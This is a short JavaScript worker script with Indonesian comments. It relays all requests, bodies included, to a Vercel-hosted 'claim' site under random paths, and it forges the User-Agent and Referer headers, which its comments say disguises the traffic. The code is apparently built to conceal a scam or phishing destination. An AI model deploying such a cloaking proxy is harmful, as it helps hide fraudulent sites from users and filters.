async function handleRequest(request) {
    const url = new URL(request.url);

    // Base URL server tujuan
    const targetBaseUrl = 'https://semoga-jaya-claim.vercel.app/';

    // Dynamic path generator
    function generateDynamicPath() {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let path = '';
        for (let i = 0; i < 10; i++) {
            path += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return path;
    }

    const dynamicPath = generateDynamicPath();
    const targetUrl = `${targetBaseUrl}/${dynamicPath}`;

    // Manipulasi header untuk menyamarkan request
    const modifiedHeaders = new Headers(request.headers);
    modifiedHeaders.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0 Safari/537.36');
    modifiedHeaders.set('Referer', 'https://google.com');

    // Kirim request ke target dengan header yang dimanipulasi
    const response = await fetch(targetUrl, {
        method: request.method,
        headers: modifiedHeaders,
        body: request.body,
        redirect: 'follow',
    });

    // Kirim balik response ke user
    return new Response(response.body, response);
}

addEventListener('fetch', (event) => {
    event.respondWith(handleRequest(event.request));
});